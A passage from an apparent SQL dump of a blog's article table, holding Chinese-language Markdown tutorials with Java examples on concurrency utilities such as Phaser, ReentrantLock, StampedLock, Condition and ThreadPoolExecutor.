throws InterruptedException {\n        System.out.println(no + s);\n        TimeUnit.SECONDS.sleep(random.nextInt(5));\n        System.out.println(no + s2);\n        phaser.arriveAndAwaitAdvance();\n    }\n}\n```\n#### 多个子线程执行公共的任务结束后,不进入阻塞,而是通知主线程自己任务完成后,继续执行自己的独立任务\n```java\n/**\n * 应用场景\n *  多个子线程执行公共的任务结束后,不进入阻塞,而是通知主线程自己任务完成后,继续执行自己的独立任务\n * {@link Phaser#arrive()} 到达但不等待\n */\npublic class PhaserExample5 {\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    // arrive 到达但不等待\n    public static void main(String[] args) throws InterruptedException {\n        /*final Phaser phaser = new Phaser();\n        new Thread(phaser::arrive).start();\n        TimeUnit.SECONDS.sleep(4);*/\n        final Phaser phaser = new Phaser(5);\n        for (int i = 0; i < 4; i++) {\n            new ArriveTask(phaser, i).start();\n        }\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(\"The phase 1 work finished done.\");\n    }\n\n    private static class ArriveTask extends Thread {\n        private final Phaser phaser;\n        private ArriveTask(Phaser phaser, int no) {\n            super(String.valueOf(no));\n            this.phaser = phaser;\n        }\n        @Override\n        public void run() {\n            System.out.println(getName() + \" start working..\");\n            PhaserExample5.sleepSeconds();\n            System.out.println(getName() + \" The phase one is running.\");\n            phaser.arrive(); // 完成了公共任务\n            PhaserExample5.sleepSeconds();\n            System.out.println(getName() + \" keep to do other thing.\"); // 做自己的任务\n        }\n    }\n\n    private static void sleepSeconds() {\n        try {\n            TimeUnit.SECONDS.sleep(random.nextInt(5));\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n#### api\n```java\n/**\n * api\n * {@link Phaser#getRegisteredParties()} 获取当前注册的Parties数量\n * {@link Phaser#getArrivedParties()} 获得当前phase阶段已到达的Parties数量\n * {@link Phaser#getUnarrivedParties()} 获得当前phase阶段未到达的Parties数量\n */\npublic class PhaserExample4 {\n    public static void main(String[] args) throws InterruptedException {\n        // final Phaser phaser = new Phaser(1);\n        // 每次parties满足,phase+1\n        /*System.out.println(phaser.getPhase());\n\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(phaser.getPhase());\n\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(phaser.getPhase());\n\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(phaser.getPhase());*/\n\n/*       System.out.println(phaser.getRegisteredParties()); // 获取当前注册的Parties数量\n       phaser.register();\n       System.out.println(phaser.getRegisteredParties());\n       phaser.register();\n       System.out.println(phaser.getRegisteredParties());*/\n\n        /*System.out.println(phaser.getArrivedParties()); // 获得当前phase阶段已到达的Parties数量\n        System.out.println(phaser.getUnarrivedParties()); // 获得当前phase阶段未到达的Parties数量*/\n\n/*      phaser.bulkRegister(10); // 一次性注册10个Parties\n        System.out.println(phaser.getRegisteredParties()); // 11\n        System.out.println(phaser.getArrivedParties()); // 0\n        System.out.println(phaser.getUnarrivedParties()); // 11\n        new Thread(phaser::arriveAndAwaitAdvance).start();\n        TimeUnit.SECONDS.sleep(1);\n        System.out.println(phaser.getRegisteredParties()); // 11\n        System.out.println(phaser.getArrivedParties()); // 1\n        System.out.println(phaser.getUnarrivedParties()); // 10*/\n\n        final Phaser phaser = new Phaser(2) {\n            // phaser是否终结结束\n            @Override\n            protected boolean onAdvance(int phase, int registeredParties) {\n                System.err.println(registeredParties);\n                return false; // true:会导致Phaser当parties满足一次阶段时就会进行销毁,不会继续使用\n                // false: 阻塞等待parties满足,使得Phaser可以多个阶段重复使用\n            }\n        };\n\n        new OnAdvanceTask(\"Alex\", phaser).start();\n        new OnAdvanceTask(\"Jack\", phaser).start();\n        TimeUnit.SECONDS.sleep(3);\n        System.out.println(phaser.getArrivedParties()); // 1\n        System.out.println(phaser.getUnarrivedParties()); // 1\n\n    }\n\n    static class OnAdvanceTask extends Thread {\n        private final Phaser phaser;\n        OnAdvanceTask(String name, Phaser phaser) {\n            super(name);\n            this.phaser = phaser;\n        }\n\n        @Override\n        public void run() {\n            System.out.println(getName() + \" I am start and the phaser \" + phaser.getPhase());\n            phaser.arriveAndAwaitAdvance();\n            System.out.println(getName() + \"I am end! \" + phaser.getPhase());\n\n            System.out.println(\"isTerminated->\" + phaser.isTerminated()); // phaser是否销毁\n\n            try {\n                TimeUnit.SECONDS.sleep(1);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            if (\"Alex\".equals(getName())) {\n                System.out.println(getName() + \" I am start and the phaser \" + phaser.getPhase());\n                phaser.arriveAndAwaitAdvance();\n                System.out.println(getName() + \" I am end!\");\n            }\n\n        }\n    }\n}\n```\n```java\n/**\n * api\n * {@link Phaser#awaitAdvanceInterruptibly } 等待当前phase阶段parties到达满足,途中被中断或超时时抛出异常\n */\npublic class PhaserExample7 {\n    public static void main(String[] args) throws InterruptedException {\n        final Phaser phaser = new Phaser(3);\n        Thread thread = new Thread(()->{\n            try {\n                phaser.awaitAdvanceInterruptibly(phaser.getPhase(), 1, TimeUnit.SECONDS);// 等待当前phase阶段parties到达满足,途中被中断或超时时抛出异常\n                System.out.println(\"Not in the current phase\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } catch (TimeoutException e2) {\n                e2.printStackTrace();\n            }\n        });\n        thread.start();\n        System.out.println(\"=========================\");\n        TimeUnit.SECONDS.sleep(10);\n        thread.interrupt();\n        System.out.println(\"==========thread.interrupt==========\");\n    }\n}\n```\n```java\n/**\n * api\n * 中断Phaser\n * {@link Phaser#forceTermination() } 中断销毁Phaser\n * {@link Phaser#isTerminated()} 改Phaser是否已中断销毁\n */\npublic class PhaserExample8 {\n    public static void main(String[] args) throws InterruptedException {\n        final Phaser phaser = new Phaser(3);\n\n        new Thread(phaser::arriveAndAwaitAdvance).start();\n\n        TimeUnit.SECONDS.sleep(3);\n        System.out.println(phaser.isTerminated());\n        phaser.forceTermination();\n        System.out.println(phaser.isTerminated());\n    }\n}\n```', 0, 0, 24, 0, 0, '2019-10-14 14:09:40', '2019-10-16 20:27:42', 0, 0);
INSERT INTO `article` VALUES (116, 1, 'StampedLock,ReentranLock,ReadWriteLock-JUC', '2019/10/1571039997_mmexport1570974200426.jpg', '### ReentranLock\n#### ReentranLock\n1. ReentrantLock需要*手动声明加锁和释放锁*,为了避免手动释放锁造成死锁,所以一定是在finally中释放锁,\n2. ReentrantLock性能优于synchronized,但synchronized也在版本迭代中不断的进行优化\n3. 锁的细粒度和灵活度:ReentrantLock优于synchronized,使得开发者可以编写自己的需求实现\n4. 可指定是公平锁还是非公平锁,而synchronized只能是非公平锁(所谓公平锁就是先等待的线程先获得锁,但不是绝对公平)\n5. 提供了一个Condition类,可以分组唤醒需要唤醒的线程,而synchronized要么随机唤醒一个线程,要么唤醒全部线程\n6. 提供能够中断等待锁的线程的机制,lock.lockInterruptibly【如果当前线程没有被中断的话,\n获取锁定.如果已经被中断了抛出异常】,*ReentrantLock实现是一种自旋锁,通过循环调用CAS原子性操作实现加锁*,\n它的性能比较好也是因为避免了使线程进入内核态的阻塞状态,想尽办法阻止内核阻塞状态是我们去分析和理解锁设计的关键钥匙\n\n#### 使用\n```java\n/**\n * ReentrantLock 显式锁\n * {@link ReentrantLock(boolean)} 是否是公平锁,默认false\n * {@link ReentrantLock#lock()} 获取锁,阻塞\n * {@link ReentrantLock#tryLock} 尝试获取锁,获取成功返回true\n * {@link ReentrantLock#lockInterruptibly()} 获取锁,途中可以被中断\n * {@link ReentrantLock#unlock()} 释放锁\n * {@link ReentrantLock#hasQueuedThreads()} waitingQueue等待队列中是否有线程\n * {@link ReentrantLock#getQueueLength()} waitingQueue等待队列中的线程数量\n * {@link ReentrantLock#hasQueuedThread(Thread)()} 某线程是否在等待队列中\n * {@link ReentrantLock#isLocked()} 锁当前是否被线程获取\n */\npublic class ReentranLockExample {\n\n    private static final ReentrantLock lock = new ReentrantLock();\n\n    public static void main(String[] args) throws InterruptedException {\n        /*IntStream.range(0, 2).forEach(i -> new Thread(){\n            @Override\n            public void run() {\n                needLockBySync();\n            }\n        }.start());*/\n        /*Thread thread1 = new Thread(() -> testUnInterruptibly());\n        thread1.start();\n        TimeUnit.SECONDS.sleep(1);\n        Thread thread2 = new Thread(() -> testUnInterruptibly());\n        thread2.start();\n        TimeUnit.SECONDS.sleep(1);\n        thread2.interrupt();\n        System.out.println(\"==============\"); */\n        /*Thread thread1 = new Thread(() -> testTryLock());\n        thread1.start();\n        TimeUnit.SECONDS.sleep(1);\n        Thread thread2 = new Thread(() -> testTryLock());\n        thread2.start();*/\n        Thread thread1 = new Thread(() -> testUnInterruptibly());\n        thread1.start();\n        TimeUnit.SECONDS.sleep(1);\n        Thread thread2 = new Thread(() -> testUnInterruptibly());\n        thread2.start();\n        TimeUnit.SECONDS.sleep(1);\n        Optional.of(lock.hasQueuedThreads()).ifPresent(System.out::println); // true waitingQueue等待队列中是否有线程\n        Optional.of(lock.getQueueLength()).ifPresent(System.out::println);// 1 waitingQueue等待队列中的线程数量\n        Optional.of(lock.hasQueuedThread(thread1)).ifPresent(System.out::println); // false thread是否在等待队列中\n        Optional.of(lock.hasQueuedThread(thread2)).ifPresent(System.out::println); // true\n        Optional.of(lock.isLocked()).ifPresent(System.out::println); // 是否已被lock\n    }\n\n    public static void testTryLock() {\n        if (lock.tryLock()) {\n            try {\n                Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" get lock and will do working.\").ifPresent(System.out::println);\n                while (true) {\n\n                }\n            } finally {\n                lock.unlock();\n            }\n        } else {\n            Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" not get lock\").ifPresent(System.out::println);\n        }\n    }\n\n    public static void testUnInterruptibly() {\n        try {\n            lock.lockInterruptibly(); // 可以被打断\n            Optional.of(Thread.currentThread().getName() + \":\"+ lock.getHoldCount()).ifPresent(System.out::println); // 当前线程对该锁的保持次数\n            Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" get lock and will do working.\").ifPresent(System.out::println);\n            while (true) {\n\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public static void needLock() {\n        try {\n            lock.lock();\n            Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" get lock and will do working.\").ifPresent(System.out::println);\n            TimeUnit.SECONDS.sleep(10);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public static void needLockBySync() {\n        synchronized (ReentranLockExample.class) {\n            try {\n                Optional.of(\"The thread-\" + Thread.currentThread().getName() + \" get lock and will do working.\").ifPresent(System.out::println);\n                TimeUnit.SECONDS.sleep(10);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n### ReentrantReadWriteLock\n#### ReentrantReadWriteLock\n1. *它在没有任何读写锁时,才可以获得写锁*\n2. 如果我们执行进行读取时,\n经常可能有*另一个执行要写入的需求*,为了保证同步,ReentrantReadWriteLock读取锁定就可以派上用场\n3. 读取很多,写入很少的情况下使用ReentrantReadWriteLock可能会使写入线程遭遇饥饿(写入线程常常无法竞争到锁定,一直处于等待状态)\n4. 实现的是悲观读取,如果你想获得写入锁的时候,*坚决不允许有任何的读锁还保持着*,所以多读取低写入时常处于饥饿\n\n\n#### 使用\n```java\n/**\n * ReentrantReadWriteLock 读写锁\n*  {@link ReentrantReadWriteLock(boolean)}  是否是公平锁,默认false\n * {@link ReentrantReadWriteLock#readLock()} 获取读锁\n * {@link ReentrantReadWriteLock#writeLock()} 获取写锁\n * W W  X\n * W R  X\n * R W  X\n * R R  O\n */\npublic class ReadWriteLockExample {\n\n\n    private final static ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock(true);\n\n    private final static Lock readLock = readWriteLock.readLock();\n\n    private final static Lock writeLock = readWriteLock.writeLock();\n\n    private final static List<Long> data = new ArrayList<>();\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread thread1 = new Thread(ReadWriteLockExample::read);\n        thread1.start();\n\n        TimeUnit.SECONDS.sleep(1);\n\n        Thread thread2 = new Thread(ReadWriteLockExample::read);\n        thread2.start();\n    }\n\n    public static void write() {\n        try {\n            writeLock.lock();\n            data.add(System.currentTimeMillis());\n            TimeUnit.SECONDS.sleep(5);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            writeLock.unlock();\n        }\n    }\n\n    public static void read() {\n        try {\n            readLock.lock();\n            data.forEach(System.out::println);\n            TimeUnit.SECONDS.sleep(5);\n            System.out.println(Thread.currentThread().getName() + \"============\");\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            readLock.unlock();\n        }\n    }\n}\n```\n\n### StampedLock\n#### StampedLock\n1. *它的目的是用于解决写锁饥饿问题*,比如99个读线程与1个写线程,很可能导致这1个写线程迟迟抢不到锁,导致数据迟迟不刷新\n2. StampedLock有三种模式: 排他写,悲观读,乐观读\n3. 所有获取锁的方法，都返回一个邮戳（Stamp），Stamp为0表示获取失败，其余都表示成功；\n4. 所有释放锁的方法，都需要一个邮戳（Stamp），这个Stamp必须是和成功获取锁时得到的Stamp一致\n5. 我们知道，在ReentrantReadWriteLock中，当读锁被使用时，如果有线程尝试获取写锁，该写线程会阻塞。\n但是，在Optimistic reading中，即使读线程获取到了读锁，写线程尝试获取写锁也不会阻塞，这相当于对读模式的优化，但是可能会导致数据不一致的问题。所以，当使用Optimistic reading获取到读锁时，必须对获取结果进行校验\n6. 这一改动可以大幅度提高程序的*吞吐量*,StampedLock对吞吐量有巨大改进,特别是读线程越来越多的情况下\n\n\n#### 使用\n```java\n/**\n * StampedLock\n * {@link StampedLock#tryOptimisticRead()}  tryOptimisticRead方法尝试一个乐观读，返回一个邮戳，作为这一次锁获取的凭证\n * {@link StampedLock#validate(long)} 判断stamp是否在读过程发生期间被修改\n */\npublic class StampedLockExample3 {\n    // Java8引入，StampedLock可以认为是读写锁的改进版本，采用乐观加锁机制\n    private final static StampedLock s1 = new StampedLock();\n    private static Point point = new Point();\n\n    public static void main(String[] args) {\n        // 写入线程\n        Runnable mRunnable = new Runnable() {\n            @Override\n            public void run() {\n                point.move(new Random().nextInt(100), new Random().nextInt(100));\n            }\n        };\n        // 读取线程\n        Runnable rRunnable = new Runnable() {\n            @Override\n            public void run() {\n                point.distanceFromOrigin();\n            }\n        };\n        // 写入\n        for (int i = 0; i < 10; i++) {\n            new Thread(mRunnable).start();\n        }\n        // 读取\n        for (int i = 0; i < 20; i++) {\n            new Thread(rRunnable).start();\n        }\n    }\n\n    // 来自JDK文档\n    public static class Point {\n        private double x, y;\n\n        public void move(double deltaX, double deltaY) {\n            // 获得排他锁 写锁\n            long stamp = s1.writeLock();\n            try {\n                x = deltaX;\n                y = deltaY;\n            } finally {\n                s1.unlockWrite(stamp);\n            }\n        }\n\n        public void distanceFromOrigin() {\n            // tryOptimisticRead方法尝试一个乐观读，返回一个邮戳，作为这一次锁获取的凭证\n            long stamp = s1.tryOptimisticRead();\n            // 将全部变量拷贝到方法体栈内\n            double currentX = x, currentY = y;\n            // 判断stamp是否在读过程发生期间被修改\n            // 如果没有被更改，则读取有效\n            // 如果stamp是不可用的，可以如CAS操作一样，循环使用乐观读\n            // 或者升级锁的级别，升级为悲观锁\n            if (!s1.validate(stamp)) { //重点\n                // 获取悲观的读锁，进一步读取数据，此时线程可能被挂起【挂起使用的是Unsafe.park()方法】\n                // park方法遇到线程中断会直接返回。可能存在park的线程再次进入循环，如果不能退出，将占用大量CPU资源\n                stamp = s1.readLock();\n                try {\n                    currentX = x;\n                    currentY = y;\n                } finally {\n                    s1.unlockRead(stamp);\n                }\n            }\n            System.out.println(currentX * currentX + currentY * currentY);\n        }\n    }\n}\n```', 0, 0, 18, 0, 0, '2019-10-14 16:00:10', '2019-10-16 20:27:35', 0, 0);
INSERT INTO `article` VALUES (117, 1, 'Condition-JUC', '2019/10/1571044776_mmexport1570975119924.jpg', '### Condition\n#### Condition\n1. 整个协作过程依靠节点在AQS的等待队列和condition的等待队列中*来回移动来实现的*\n2. Condition作为一个条件类很好的维护了一个等待信号的队列并在适时的时候将节点放入AQS等待队列中实现唤醒操作\n3. Condition也是一个*多线程间起到协调通信的工具类*,或者某个线程等待某个条件,只有当某条件满足这些等待的线程才会被唤醒\n4. Condition相对于传统synchronized的线程通信更加便于使用\n\n#### 单生产消费模式\n```java\n/**\n * 单生产消费模式\n * {@link ReentrantLock#lock } 获取锁 阻塞\n * {@link ReentrantLock#unlock } 释放锁\n * {@link Condition#await }  进入等待 相当于monitor.wait()\n * {@link Condition#signal } 唤醒Condition中单个线程 相当于monitor.notify()\n * {@link Condition#signalAll } 唤醒Condition中全部线程 相当于monitor.notify()\n */\npublic class ConditionExample1 {\n\n    private final static ReentrantLock lock = new ReentrantLock();\n\n    private final static Condition condition = lock.newCondition();\n\n    private static int data = 0;\n\n    private static volatile boolean noUse = true;\n\n    public static void main(String[] args) {\n        new Thread(()->{\n            for(;;) {\n                buildData();\n            }\n        }).start();\n\n        new Thread(()->{\n            for(;;) {\n                useData();\n            }\n        }).start();\n    }\n\n    private static void buildData() {\n        try {\n            lock.lock(); // synchronized monitorEnter\n            while (noUse) {\n                condition.await(); // monitor.wait()\n            }\n            Optional.of(\"P:\" + data).ifPresent(System.out::println);\n            TimeUnit.SECONDS.sleep(1);\n            data++;\n            noUse = true;\n            condition.signal(); // monitor.notify()\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock(); // synchronized monitorEnter\n        }\n    }\n\n    private static void useData() {\n        try {\n            lock.lock();\n            while (!noUse) {\n                condition.await();\n            }\n            Optional.of(\"C:\" + data).ifPresent(System.out::println);\n            noUse = false;\n            condition.signal();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n}\n```\n#### 多生产消费模式\n```java\n/**\n * 多生产消费模式\n *  由于synchronized与monitor的关系,导致传统synchronized只能唤醒全部线程来完成\n *  而Condition使得不同的线程可以在不同的Condition中,更方便线程的唤醒与等待\n */\npublic class ConditionExample3 {\n\n    private final static ReentrantLock lock = new ReentrantLock();\n\n    private final static Condition PRODUCE_COND = lock.newCondition();\n\n    private final static Condition CONSUME_COND = lock.newCondition();\n\n    private final static LinkedList<Long> TIMESTAMP_POOL = new LinkedList<>();\n\n    private final static int MAX_CAPACITY = 100;\n\n    public static void main(String[] args) throws InterruptedException {\n        IntStream.range(0, 5).boxed().forEach(ConditionExample3::beginProduce);\n        IntStream.range(0, 5).boxed().forEach(ConditionExample3::beginConsume);\n        for(;;) {\n            TimeUnit.SECONDS.sleep(5);\n            System.out.println(\"===========\");\n            // 要在lock的线程调用这些方法,否则抛出异常\n            /*System.out.println(\"PRODUCE_COND.getWaitQueueLength>\" + lock.getWaitQueueLength(PRODUCE_COND));\n            System.out.println(\"CONSUME_COND.getWaitQueueLength>\" + lock.getWaitQueueLength(CONSUME_COND));\n            System.out.println(\"PRODUCE_COND.hasWaiters>\" + lock.hasWaiters(PRODUCE_COND));\n            System.out.println(\"CONSUME_COND.hasWaiters>\" + lock.hasWaiters(CONSUME_COND));*/\n        }\n    }\n\n    public static void beginProduce(int i) {\n        new Thread(()->{\n            for(;;) {\n                produce();\n                sleep(2);\n            }\n        }, \"P-\" + i).start();\n    }\n\n    public static void beginConsume(int i) {\n        new Thread(()->{\n            for(;;) {\n                consume();\n                sleep(3);\n            }\n        }, \"C-\" + i).start();\n    }\n\n    public static void produce() {\n        try {\n            lock.lock();\n            while (TIMESTAMP_POOL.size() >= MAX_CAPACITY) {\n                PRODUCE_COND.await();\n            }\n            Long value = System.currentTimeMillis();\n            System.out.println(Thread.currentThread().getName() + \"-P-\" + value);\n            TIMESTAMP_POOL.addLast(value);\n            CONSUME_COND.signalAll();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public static void consume() {\n        try {\n            lock.lock();\n            while (TIMESTAMP_POOL.isEmpty()) {\n                CONSUME_COND.await();\n            }\n            Long value = TIMESTAMP_POOL.removeFirst();\n            System.out.println(Thread.currentThread().getName() + \"-C-\" + value);\n            PRODUCE_COND.signalAll();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    private static void sleep(long sec) {\n        try {\n            TimeUnit.SECONDS.sleep(sec);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```', 0, 0, 20, 0, 0, '2019-10-14 17:19:44', '2019-10-16 20:27:26', 0, 0);
INSERT INTO `article` VALUES (118, 1, 'ThreadPoolExecutor', '2019/10/1571221710_mmexport1570975567523.jpg', '### ThreadPoolExecutor\n#### ThreadPoolExhrecutor\n1. ThreadPoolExhrecutor是Executors创建线程的工厂对象\n\n#### 什么是线程池\n1. Java中的线程池是运用场景最多的并发框架,几乎所有需要异步或并发执行任务的程序,都可以使用线程池\n2. 将线程集中管理的集合\n\n#### 线程池的目的\n1. 降低资源消耗: 通过重复利用已创建的线程降低创建线程和销毁造成的消耗\n2. 提高响应速度: 当任务到达时,任务可以不需要等到线程创建就能立即执行\n3. 提高线程的可管理性。线程是稀缺资源。如果无限制地创建,不仅仅会消耗系统资源,还有降低系统的稳定性,使用线程池可以进行统一分配,调优和监控,但是要做到合理利用\n4. 可有效控制最大并发线程数,提高系统资源利用率,同时可以避免过多的资源竞争,避免阻塞\n\n#### new Thread的弊端\n1. 每次new Thread新建对象,性能差\n2. 线程缺乏统一管理,可能无限制的新建线程,相互竞争,有可能占用过多系统资源导致死机或OOM\n3. 缺少更多功能,如更多执行,定期执行,线程中断\n4. 频繁创建多线程,非常占用CPU内存\n\n### ThreadPoolExecutor的核心参数\n![threadpoolexecutor.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544772286_threadpoolexecutor.png)\n1. *corePoolSize*: 核心线程数量,实际运用线程数(正式工)\n2. *maximumPoolSize*: 最大线程数(临时工)\n3. *keepAliveTime*: 最大线程数销毁前的等待时间(临时工无事时的解雇期限)\n4. *unit*: 等待时间的时间单位\n5. *workQueue*: 保存等待执行任务的阻塞队列,当我们提交一个新的任务到线程池以后,线程池会根据当前线程池中正在运行中的数量来决定该任务的处理方式\n6. *threadFactory*: 线程工厂,用来创建线程,默认有个默认工厂创建线程,使用默认工程创建线程时,会使新创建的线程具有相同的优先级,并且是非守护的线程,同时也设置了线程的名称\n7. *rejectHandler*: 当拒绝处理任务时的策略,如果workQueue阻塞队列满了,并且没有空闲的线程时,这时还在继续提交任务,这时就需要一种策略来处理这种任务,线程池一共提供了四种策略\n\n### ThreadPoolExecutor内部逻辑过程\n![exector.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544772975_exector.png)\n1. 如果运行数少于corePoolSize时,直接创建新线程来处理任务,即使线程池中其他线程时空闲的\n2. 如果线程池中的数量大于等于corePoolSize,且小于maximumPoolSize时,只有当workQueue满时,才创建新的线程处理任务\n3. 如果corePoolSize和maximumPoolSize相同的话,那么创建线程池的大小是固定的,这时如果有新的提交,如果workQueue没有满的时候,就把请求放入workQueue中,等待有空闲的线程,从里面取出任务处理\n4. 如果线程数量大于maximumPoolSize时,此时如果workQueue也是满的,那么就会根据策略处理\n5. 首先判断corePoolSize然后workQueue接着maximumPoolSize\n6. 保存等待执行任务的阻塞队列,当我们提交一个新的任务到线程池以后,线程池会根据当前线程池中正在运行中的数量来决定该任务的处理方式,处理方式一共有三种\n7. 当线程池中的线程数量大于corePoolSize时,如果这时没有新的任务提交,核心线程外的线程不会立即销毁而是等待,直到等待时间超过keepAliveTime\n8. 如果workQueue阻塞队列满了,并且没有空闲的线程时,这时还在继续提交任务,这时就需要按照策略来处理这种任务\n\n#### 核心线程数和最大线程数有什么区别\n1. 核心线程数: 实际正式运用线程数\n2. 最大线程数: 线程池最多负载临时创建线程数,会被等待时间销毁\n\n#### 如何配置线程池\n1. IO密集性,配置*最大线程数*,相当于 *2 乘以 CPU核心数*\n2. CPU密集性,配置*最大线程数*,相当于 *CPU核心数* + 1 \n3. IO密集性: 任务需要大量的IO操作,*存在阻塞*,浪费CPU资源\n4. CPU密集性: 任务需要大量运算,*没有阻塞*(请求,数据库)*,*不浪费CPU资源*\n\n### ThreadPoolExecutor的状态\n![threadpoolstatus.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544775125_threadpoolstatus.png)\n1. **running状态**: 判断新提交的任务并且也能处理阻塞队列中的任务\n2. **shutdown状态**: 当一个线程池实例处于shutdown状态,不能接受新提交的任务,但是*可以处理队列中已经的任务*; 在线程池处理running状态时,调用*shutdown*方法时,会使线程池进入到该状态 \n3. **stop状态**: 也不接受新提交的任务,也*不处理队列中的任务*;*中断正在处理任务的线程*;当线程池处于running状态时,如果调用了*shutdownNow*方法时,会使线程进入该状态\n4. **tidying状态**: 如果所有的任务都已经终止了,这时的有效线程数为0,线程池会进入该状态;之后调用terminated方法会进入到terminated状态\n5. **terminated状态**: 执行完毕,线程池彻底终止\n\n### ThreadPoolExecutor的四种任务队列处理策略\n```java\n// 当任务队列满时的处理策略;除了以下四种策略外,也可以自定义处理策略\n\n// AbortPolicy 异常通知,直接抛出异常\npublic void rejectedExecution(Runnable r, ThreadPoolExecutor e) {\n   throw new RejectedExecutionException(\"Task \" + r.toString() + \" rejected from \" + e.toString());\n} \n\n// DiscardPolicy 拒绝通知,啥也不做,不要使用这个 \npublic void rejectedExecution(Runnable r, ThreadPoolExecutor e) { }\n\n// CallerRunsPolicy 让调用线程来执行,调用线程的其他操作将被阻塞\npublic void rejectedExecution(Runnable r, ThreadPoolExecutor e) {\n   if (!e.isShutdown()) {\n      r.run();\n   }\n}\n\n// DiscardOldestPolicy 把队列中的第一个丢弃,将新的这个任务执行或放入队列中\npublic void rejectedExecution(Runnable r, ThreadPoolExecutor e) {\n   if (!e.isShutdown()) {\n      e.getQueue().poll();\n      e.execute(r);\n   }\n}\n```\n\n### ThreadPoolExecutor的方法\n1. **execute()**: 提交任务,交给线程池执行\n2. **submit()**: 提交任务,*能够返回执行结果值* Callable+Future\n3. **shutdown()**: 关闭线程池,启动线程池的有序关闭过程，其等待已经提交的所有任务完成之后关闭线程池。当调用该方法后，线程池不再接受其他任务。并且*该方法是非阻塞的，不会等待所有任务执行成功后返回*\n4. **shutdownNow()**: 关闭线程池,返回当前队列中的线程,不等待任务执行完,*也会关闭正在执行的线程,谨慎使用*\n5. **awaitTermination**: shutdown方法被调用之后或参数中定义的timeout时间到达或当前线程被打断，这几种情况任意一个发生了都会导致该方法在所有任务完成之后才返回,*执行该方法会阻塞等待线程池中的任务全部完成*;*超时会导致立即返回,但不会终止线程池的任务执行*\n6. **getTaskCount()**: 线程池已执行和未执行的任务总数\n7. **getCompletedTaskCount()**: 已完成的任务数量\n8. **getPoolSize()**: 线程池当前的线程数量\n9. **getActiveCount()**: 当前线程池中正在执行任务的线程数量', 0, 0, 44, 0, 0, '2019-10-16 18:28:38', '2019-10-16 22:07:57', 0, 0);
INSERT INTO `article` VALUES (119, 1, 'ExecutorService常见问题与API', '2019/10/1571232748_mmexport1570973895629.jpg', '### ExecutorService常见问题\n#### 汇总\n1. 线程池调用shutdown方法可以继续执行新的任务吗\n2. shutdown与shutdownNow区别\n3. awaitTermination超时会终止任务执行吗\n4. 执行一次任务后,是直接创建所有核心线程,还是懒加载式创建线程\n5. 直接向队列中添加任务可以执行吗\n\n#### 线程池调用shutdown方法可以继续执行新的任务吗\n```java\n	/**\n     * Question:\n     * <p>\n     *     When invoked the shutdown method,can execute the new runnable?\n     *     线程池调用shutdown方法可以继续执行新的runnable吗\n     * Answer:\n     *      No!!! the Executor Service will rejected after shutdown\n     *      不可以,执行服务将在关闭后拒绝接收新的任务\n     * {@link ExecutorService#isShutdown()}\n     */\n    private static void isShutDown() {\n        ExecutorService executorService = Executors.newSingleThreadExecutor();\n        executorService.execute(()->{\n            try {\n                TimeUnit.SECONDS.sleep(5);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        System.out.println(executorService.isShutdown()); // false\n        executorService.shutdown();\n        executorService.execute(()->{System.out.println(\"add new task after shutdown\");});// 会抛出异常\n        System.out.println(executorService.isShutdown());// true\n        executorService.execute(()-> System.out.println(\"I will be executed after shutdown?\"));\n    }\n```\n#### shutdown与shutdownNow区别\n```java\n/**\n * shutdown与shutdownNow\n * {@link ExecutorService#shutdown()} 关闭线程池,启动线程池的有序关闭过程，其等待已经提交的所有任务完成之后关闭线程池。当调用该方法后，线程池不再接受其他任务\n * {@link ExecutorService#shutdownNow()} 关闭线程池,返回当前队列中的线程,不等待任务执行完,也会关闭正在执行的线程,谨慎使用\n */\npublic class ThreadPoolExecutorTask {\n    public static void main(String[] args) throws InterruptedException {\n        ExecutorService executorService = new ThreadPoolExecutor(10, 20, 30, TimeUnit.SECONDS,\n                new ArrayBlockingQueue<Runnable>(10), r -> {\n            Thread t = new Thread(r);\n            return t;\n        }, new ThreadPoolExecutor.AbortPolicy());\n        IntStream.range(0, 20).boxed().forEach(i -> {\n            executorService.execute(()->{\n                try {\n                    TimeUnit.SECONDS.sleep(10);\n                    System.out.println(Thread.currentThread().getName() + \" [\" + i + \"] finish done.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            });\n        });\n\n        useShutDown(executorService);\n\n        useShutDownNow(executorService);\n    }\n\n    /**\n     * shutdown\n     *  20 threads      20个线程\n     *  10 threads work 10个在工作\n     *  10 idle         10个空闲\n     *\n     * shutdown invoked                     shutdown调用时\n     *  1. 10 waiting to finish the work    等待10个工作线程工作完毕后打断\n     *  2. 10 interrupted the idle works.   打断空闲的10个线程\n     *  3. 20 idle thread will exist        全部线程退出\n     * @param executorService\n     